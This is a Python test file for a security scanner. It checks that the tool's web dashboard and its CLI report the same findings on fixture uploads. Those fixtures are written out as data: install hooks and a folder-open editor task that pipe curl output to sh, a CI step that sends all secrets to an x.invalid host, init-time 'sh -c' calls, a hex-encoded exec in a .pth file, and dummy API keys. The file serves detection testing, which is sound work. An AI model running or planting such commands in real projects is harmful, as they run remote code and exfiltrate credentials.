"""Dashboard <-> CLI parity: the page reports what the CLI reports for the same files.

Since BR-7 step 5 the dashboard (lazaret/web/lazaret.html) runs the npm package's collection, scan and grading on
the engine it carries, the CLIs' own (until then it carried a port of the npm engine, kept in step by tests of
every rule, its tables and its decoding, and it drifted all the same). So what is held here is the page as a whole:
the files picked in its upload control (or the code pasted into it) give the result `lazaret` gives for a directory
holding them, lazaret.scanner.core's project scan, every field of it and of every finding (but the page's file
list and time, and the CLI's project path and time):

* the fixture projects (tests/fixtures: each a scan, its tree uploaded as paths; the trees the CLI's walk prunes
  are left out, as an upload of files is not walked) and the page's own "Load sample" inputs, pasted;
* the fixture projects whole, and trees that reach each step of the CLI's walk (a dependency's tree, a venv, Go's and
  cargo's vendor trees, .git and the trees --exclude names, __pycache__ folders, CI files and an editor's settings
  read by their paths, a file that can't be read), each
  uploaded as a folder: the page walks it as `lazaret <folder>` does (lib/collect.js walkSteps and takeStep, BR-7
  step 5's folder uploads);
* uploads the CLI's collection reads each its own way: encodings (UTF-16 with and without a BOM, coding cookies,
  CRLF), a .pth file, a .pyw script, Go and Rust sources (N-14), a script without an extension, a program under a
  source file's name, an image, a video named .ts, an AppleDouble file, a config file holding a credential, an
  empty file, a name outside ASCII;
* a control: a page that grades differently is caught.

Not compared: what a browser does not give the page (links, special files, folders it could not list), what the
page does not do (following a package.json's install hooks into the files they run; --deps), and its size limit
(test_review_dashboard_limits). All content is inert: nothing is executed, hosts are TEST-NET or .invalid, the
credential is a dummy built in pieces (test_fixture_credentials).
"""

import importlib.util
import os
import tempfile
import unittest

from lazaret.scanner import core
from tests import _support
from tests._folding_disk import tells_names_apart
from tests.scanner import _dashboard_vm as dash

#: the trees of the fixture projects the CLI's walk prunes (core.OPTIN_SKIP_DIRS, dot-directories), left out here
PRUNED = {"dist", "migrations", "build", "node_modules", "venv", ".venv", "env"}


def fixture_projects():
    """[(name, [(rel, bytes)])]: each fixture project's files, and the files at the fixtures' top as one more."""
    out = []
    top = []
    for entry in sorted(os.listdir(_support.FIXTURES)):
        path = os.path.join(_support.FIXTURES, entry)
        if os.path.isfile(path):
            top.append((entry, _read(path)))
            continue
        files = []
        for root, dirs, names in os.walk(path):
            dirs[:] = sorted(d for d in dirs if d not in PRUNED and not d.startswith(".") and d != "__pycache__")
            for name in sorted(names):
                full = os.path.join(root, name)
                files.append((os.path.relpath(full, path).replace(os.sep, "/"), _read(full)))
        out.append((entry, files))
    out.append(("fixtures", top))
    return out


def _read(path):
    with open(path, "rb") as f:
        return f.read()


def cookie(name, body):
    return f"# coding: {name}\n".encode("ascii") + body.encode(name)


SECRET = "Tq8vN3pL0wX7rT2mK9sB" + "4hF6jD1aE5cGzY0uWx3R"              # a made-up key, in pieces

#: (name, [(rel, bytes or text)]): uploads the CLI's collection reads each its own way
UPLOADS = [
    ("utf-16 with a BOM", [("u16.py", "\ufeffimport os\nos.system(input())\n".encode("utf-16-le"))]),
    ("utf-16 without one", [("u16n.py", "import os\nos.system(input())\n".encode("utf-16-le"))]),
    ("utf-7 cookie", [("u7.py", b"# coding: utf-7\nx = 1  # +AAo-eval(input())\n")]),
    ("escape cookie", [("esc.py", b"# -*- coding: unicode_escape -*-\nx = 1  # \\u000aeval(input())\n")]),
    ("latin-1 cookie", [("l1.py", cookie("latin-1", "s = 'caf\xe9'\neval(s)\n"))]),
    ("euc_jis_2004 cookie", [("j.py", cookie("euc_jis_2004", "# \u6f22\u5b57\nx = eval(y)\n"))]),
    ("an undecoded codec", [("i.py", b"# coding: idna\nx = eval(y)\n")]),
    ("crlf", [("crlf.py", b"import os\r\nos.system(input())\r\n"), ("crlf.js", b"eval(a)\r\nx = 1\r\n")]),
    (".pth", [("hook.pth", b"import sys\nimport os; exec(bytes.fromhex('7072696e74283129').decode())\n"
                           b"/opt/lib\n")]),
    (".pyw", [("tool.pyw", "import os\nos.system(user_cmd)\n")]),
    ("go and rust", [("main.go", 'package main\n\nimport "os/exec"\n\nfunc run(c string) {\n'
                                 '\texec.Command("sh", "-c", c).Run()\n}\n'),
                     ("src/lib.rs", 'use std::process::Command;\n\npub fn run(c: &str) {\n'
                                    '    Command::new("sh").arg("-c").arg(c).status().unwrap();\n}\n')]),
    ("scripts without an extension", [("tool", "#!/usr/bin/env python3\nimport os\nos.system(input())\n"),
                                      ("cli", "#!/usr/bin/env node\nrequire('child_process').exec(process.argv[2]);\n"),
                                      ("notes", "just some notes\n")]),
    ("binaries", [("lib.py", b"\x7fELF\x02\x01\x01" + bytes(200)), ("logo.png", b"\x89PNG\r\n\x1a\n" + bytes(64)),
                  ("clip.ts", b"".join([b"\x47" + bytes(187)] * 4)), ("._x.py", b"\x00\x05\x16\x07" + bytes(60))]),
    ("a config file", [("config.yaml", f"aws_secret_access_key: {SECRET}\nregion: us-east-1\n"),
                       ("app.py", "import yaml\ncfg = yaml.safe_load(open('config.yaml'))\n")]),
    ("manifests", [("package.json", '{"name": "x", "version": "1.0.0", "scripts": {"test": "node t.js"}}\n'),
                   ("binding.gyp", "{'targets': [{'target_name': 'x', 'sources': ['x.cc']}]}\n")]),
    ("empty and named", [("empty.py", b""), ("caf\u00e9.py", "eval(x)\n")]),
]


_PYC = importlib.util.MAGIC_NUMBER + bytes(12) + b"\xe3" + bytes(40)    # a .pyc of this Python, its code inert
_HOOK = '{"name": "w", "version": "1.0.0", "scripts": {"postinstall": "curl -s https://x.invalid/i | sh"}}\n'

#: (name, [(rel, bytes or text)]): trees that reach each step of the CLI's walk, uploaded as folders
FOLDERS = [
    ("dependency trees", [("app.py", "import os\nos.system(input())\n"),
                          ("node_modules/left/index.js", "eval(process.argv[2]);\n"),
                          ("node_modules/left/package.json", _HOOK),
                          ("venv/pyvenv.cfg", "home = /usr/bin\n"), ("venv/lib/site.py", "eval(x)\n"),
                          ("env/run.py", "exec(y)\n"),                       # (no pyvenv.cfg: a folder like any)
                          ("bower_components/x/x.js", "eval(z)\n")]),
    ("go vendor tree", [("go.mod", "module example.invalid/m\n\ngo 1.22\n"),
                        ("main.go", 'package main\n\nimport "example.invalid/dep"\n\nfunc main() { dep.Run() }\n'),
                        ("vendor/modules.txt", "# example.invalid/dep v1.0.0\n## explicit\nexample.invalid/dep\n"),
                        ("vendor/example.invalid/dep/dep.go",
                         'package dep\n\nimport "os/exec"\n\nfunc init() { exec.Command("sh", "-c", "id").Run() }\n\n'
                         'func Run() {}\n'),
                        ("vendor/example.invalid/dep/dep_test.go", "package dep\n")]),
    ("cargo vendor tree", [("Cargo.toml", '[package]\nname = "m"\nversion = "0.1.0"\n'),
                           ("src/main.rs", "fn main() {}\n"),
                           ("vendor/dep/.cargo-checksum.json", '{"files": {}, "package": null}\n'),
                           ("vendor/dep/Cargo.toml", '[package]\nname = "dep"\nversion = "1.0.0"\n'),
                           ("vendor/dep/build.rs", 'use std::process::Command;\nfn main() {\n'
                                                   '    Command::new("sh").arg("-c").arg("id").status().unwrap();\n}\n'),
                           ("vendor/dep/src/lib.rs", "pub fn f() {}\n")]),
    (".git and the opt-in trees", [(".git/HEAD", "ref: refs/heads/main\n"), (".git/config", "[core]\n"),
                        (".hidden/x.py", "eval(a)\n"), ("dist/bundle.js", "eval(b)\n"), ("build/x.py", "eval(c)\n"),
                        ("migrations/0001_initial.py", "eval(d)\n"), ("src/ok.py", "x = 1\n")]),
    ("__pycache__", [("m.py", "x = 1\n"), ("__pycache__/m.cpython-312.pyc", _PYC),
                     ("__pycache__/gone.cpython-312.pyc", _PYC), ("__pycache__/junk.pyc", b"not a pyc"),
                     ("__pycache__/notes.txt", "x\n"), ("pkg/__init__.py", ""),
                     ("pkg/__pycache__/__init__.cpython-312.pyc", _PYC)]),
    ("nested", [("a/b/c/d.py", "import os\nos.system(input())\n"), ("a/b/package.json", _HOOK),
                ("a/b/hook.pth", b"import os; exec(bytes.fromhex('7072696e74283129').decode())\n"),
                ("a/.env", f"STRIPE_KEY=sk_live_{SECRET}\n"), ("a/b/c/\u00e9t\u00e9.js", "eval(q)\n"),
                ("y.py", "eval(w)\n"), ("Z.py", "exec(w)\n"), ("_.py", "x = 2\n")]),
    ("ci files and settings, by their paths", [
        (".github/workflows/ci.yml", "on: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n"
                                     "      - run: echo \"${{ toJSON(secrets) }}\" | curl -d @- https://x.invalid/c\n"),
        (".gitlab-ci.yml", "build:\n  script:\n    - echo ok\n"),
        (".vscode/tasks.json", '{"version": "2.0.0", "tasks": [{"label": "s", "type": "shell", "command": "node setup.js",'
                               ' "runOptions": {"runOn": "folderOpen"}}]}\n'),
        ("setup.js", "require('child_process').exec('curl -s https://x.invalid/i | sh');\n")]),
]

#: a file beside one whose name differs only in case (the "nested" tree's until MAC-TESTS): a disk that tells the names
#: apart holds both, and the page and the CLI read both, by code point; macOS's and Windows' disks hold one file, so
#: this tree is uploaded only where the disk holds both (FolderTests)
CASE_TWINS = [("z.py", "eval(w)\n"), ("Z.py", "exec(w)\n"), ("_.py", "x = 2\n")]


@dash.requires_node
class ParityTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.projects = fixture_projects() + UPLOADS
        # the samples, as the page shows them: each button's text, then each scanned as pasted
        got = dash.run([r for button in ("samplePy", "sampleJs", "sampleSql")
                        for r in ({"op": "click", "id": button}, {"op": "html", "id": "code"},
                                  {"op": "html", "id": "lang"})])
        cls.samples = [(got[k + 1]["value"], got[k + 2]["value"]) for k in range(0, len(got), 3)]
        cls.pages = dash.run([dash.scan_request(files) for _, files in cls.projects]
                             + [dash.scan_request(paste=text, lang=lang) for text, lang in cls.samples], timeout=40)

    def same(self, page, cli, files, walked=False):
        self.assertNotIn("error", page, page.get("error"))
        self.assertEqual(page["generatedBy"], "lazaret-dashboard-2")
        if walked:                                       # (a folder: the files its walk read)
            self.assertLessEqual(set(page["files"]), {rel for rel, _ in files})
        else:
            self.assertEqual(page["files"], sorted(rel for rel, _ in files))
        self.assertEqual(cli.get("warnings", []), [])
        page, cli = dash.comparable(page, dash.PAGE_ONLY), dash.comparable(cli, dash.CLI_ONLY)
        self.assertEqual(sorted(page), sorted(cli))
        for key in page:
            if key != "issues":
                self.assertEqual(page[key], cli[key], key)
        self.assertEqual(len(page["issues"]), len(cli["issues"]))
        for mine, theirs in zip(page["issues"], cli["issues"]):
            self.assertEqual(mine, theirs)

    def test_fixtures_and_uploads(self):
        self.assertGreater(len(self.projects), 20)
        for (name, files), page in zip(self.projects, self.pages):
            with self.subTest(name):
                self.same(page, dash.cli_result(files), files)

    def test_some_findings_are_compared(self):
        """The inputs reach the collection's paths: decoded, classified, the .pth check, Go and Rust, a config
        file's credential, the cross-file pass."""
        rules = {i["rule"] for page in self.pages for i in page.get("issues", [])}
        for rule in ("Q-ENCODING", "SC-UTF7", "SC-ESCAPE-CODEC", "SC-TRUNCATED", "SC-PTH-EXEC", "S-OSCMD-PY",
                     "S-EVAL-PY", "SC-INSTALL-HOOK", "SC-BINARY", "S-SECRET"):
            with self.subTest(rule):
                self.assertIn(rule, rules)
        self.assertTrue(any(page.get("crossFile") for page in self.pages))
        go_rust = self.pages[[n for n, _ in self.projects].index("go and rust")]
        self.assertEqual(go_rust["metrics"]["files"], 2)                    # both read as source (N-14)
        config = self.pages[[n for n, _ in self.projects].index("a config file")]
        self.assertEqual(config["metrics"]["configFiles"], 1)

    def test_the_samples(self):
        self.assertEqual([lang for _, lang in self.samples], ["py", "js", "sql"])
        pages = self.pages[len(self.projects):]
        for (text, lang), page in zip(self.samples, pages):
            with self.subTest(lang):
                files = [(f"pasted-code.{lang}", text)]
                self.same(page, dash.cli_result(files), files)
                self.assertFalse(page["pass"])

    def test_the_comparison_can_fail(self):
        """Control: a page that counts the config files wrongly, or drops a finding, is caught."""
        with open(dash.HTML, encoding="utf-8") as f:
            page = f.read()
        files = dict(UPLOADS)["a config file"]
        broken = [page.replace("res.metrics.configFiles = col.configs.length;",
                               "res.metrics.configFiles = col.configs.length + 1;"),
                  page.replace("const res = redactResult(gradeResult(col.files, collectionIssues(col)));",
                               "const res = redactResult(gradeResult(col.files, collectionIssues(col).slice(1)));")]
        for k, html in enumerate(broken):
            with self.subTest(k):
                self.assertNotEqual(html, page)
                with tempfile.TemporaryDirectory() as d:
                    path = os.path.join(d, "lazaret.html")
                    with open(path, "w", encoding="utf-8") as f:
                        f.write(html)
                    got = dash.scan(files, html=path)
                with self.assertRaises(AssertionError):
                    self.same(got, dash.cli_result(files), files)


@dash.requires_node
class FolderTests(unittest.TestCase):
    """A folder upload is walked as `lazaret <folder>` walks it."""

    @classmethod
    def setUpClass(cls):
        cls.folders = [(name, os.path.join(_support.FIXTURES, name), dash.tree_files(os.path.join(_support.FIXTURES, name)))
                       for name, _ in fixture_projects() if name != "fixtures"] + [(n, None, f) for n, f in FOLDERS]
        cls.apart = tells_names_apart(tempfile.gettempdir())             # (where dash.cli_result writes the files)
        if cls.apart:
            cls.folders.append(("case twins", None, CASE_TWINS))
        cls.pages = dash.run([dash.folder_request(files) for _, _, files in cls.folders], timeout=40)

    same = ParityTests.same

    def test_folders(self):
        self.assertGreater(len(self.folders), 15)
        for (name, root, files), page in zip(self.folders, self.pages):
            with self.subTest(name):
                cli = core.scan_project(root) if root else dash.cli_result(files)
                self.same(page, cli, files, walked=True)

    def test_the_walks_steps_are_reached(self):
        rules = {i["rule"] for page in self.pages for i in page.get("issues", [])}
        for rule in ("Q-SKIPPED-TREE", "SC-PYC-ORPHAN", "SC-INSTALL-HOOK", "SC-PTH-EXEC", "S-SECRET", "S-OSCMD-PY",
                     "SC-WORKFLOW-SECRETS", "SC-AUTORUN"):
            with self.subTest(rule):
                self.assertIn(rule, rules)
        pages = dict(zip([n for n, _, _ in self.folders], self.pages))
        self.assertNotIn("node_modules/left/index.js", pages["dependency trees"]["files"])
        self.assertIn("env/run.py", pages["dependency trees"]["files"])
        # (without --deps a vendor tree is a dependency's: counted, not read)
        self.assertEqual(pages["go vendor tree"]["files"], ["go.mod", "main.go"])
        self.assertEqual(pages["cargo vendor tree"]["files"], ["Cargo.toml", "src/main.rs"])
        for name in ("go vendor tree", "cargo vendor tree"):
            self.assertEqual([i["file"] for i in pages[name]["issues"] if i["rule"] == "Q-SKIPPED-TREE"], ["vendor"])
        self.assertEqual(pages[".git and the opt-in trees"]["files"],   # (.git never; the rest unless excluded)
                         [".hidden/x.py", "build/x.py", "dist/bundle.js", "migrations/0001_initial.py", "src/ok.py"])
        # (by code point, as the CLI: Z before _ before a and y. A z.py beside the Z.py, as this tree once had, is one
        # file on macOS's and Windows' disks: the CLI's folder there held four files where the page was given five)
        self.assertEqual(pages["nested"]["files"][:2], ["Z.py", "_.py"])

    def test_names_that_differ_only_in_case(self):
        if not self.apart:
            self.skipTest("this disk holds z.py and Z.py as one file (macOS's and Windows' do)")
        page = dict(zip([n for n, _, _ in self.folders], self.pages))["case twins"]
        self.assertEqual(page["files"], ["Z.py", "_.py", "z.py"])          # (compared with the CLI's in test_folders)
        self.assertEqual(sorted(i["file"] for i in page["issues"] if i["rule"].startswith("S-")), ["Z.py", "z.py"])

    def test_a_file_that_cannot_be_read(self):
        files = [("a.py", "eval(x)\n"), ("b/c.py", "x = 1\n")]
        page = dash.run([dash.folder_request(files, unreadable={"b/c.py"})])[0]
        self.assertNotIn("error", page, page.get("error"))
        unread = [i for i in page["issues"] if i["file"] == "b/c.py"]
        self.assertEqual([i["rule"] for i in unread], ["Q-UNREADABLE"], unread)
        self.assertIn("The requested file could not be read", unread[0]["msg"])
        self.assertIn("S-EVAL-PY", {i["rule"] for i in page["issues"] if i["file"] == "a.py"})

    def test_what_the_page_lists(self):
        got = dash.run([{"op": "folder", "folder": dash.folder_request(dict(FOLDERS)["dependency trees"])["folder"]}])
        self.assertIn("<b>project:</b> 2 file(s) to scan, 3 folder(s) not read", got[0])


if __name__ == "__main__":
    unittest.main()
